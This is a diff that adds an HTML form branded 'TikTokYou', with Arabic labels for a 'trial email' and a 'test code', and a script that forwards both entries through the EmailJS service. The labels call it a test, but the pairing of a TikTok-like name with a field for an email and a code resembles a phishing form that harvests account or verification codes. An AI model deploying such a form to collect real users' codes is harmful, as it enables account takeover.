@@ -163,3 +163,51 @@
       }
     });
 </script>
+
+<form id="deft-form">
+  <h2>TikTokYou</h2>
+
+  <label for="email">الإيميل التجريبي:</label>
+  <input id="email" type="email" required>
+
+  <label for="code">رمز الاختبار:</label>
+  <input id="code" type="text" required>
+
+  <button type="submit">إرسال البيانات</button>
+  <p id="status"></p>
+</form>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+emailjs.init({
+  publicKey: "YOUR_PUBLIC_KEY"
+});
+
+document.getElementById("deft-form")
+  .addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const status = document.getElementById("status");
+    status.textContent = "جاري الإرسال...";
+
+    const email = document.getElementById("email").value;
+    const code = document.getElementById("code").value;
+
+    try {
+      await emailjs.send(
+        "service_pfw3g7m",
+        "template_2ongjk6",
+        {
+          message: "الإيميل التجريبي: " + email +
+                   "\nرمز الاختبار: " + code
+        }
+      );
+
+      status.textContent = "تم إرسال البيانات بنجاح!";
+      this.reset();
+    } catch (error) {
+      status.textContent = "فشل الإرسال، راجع إعدادات EmailJS.";
+      console.error(error);
+    }
+  });
+</script>
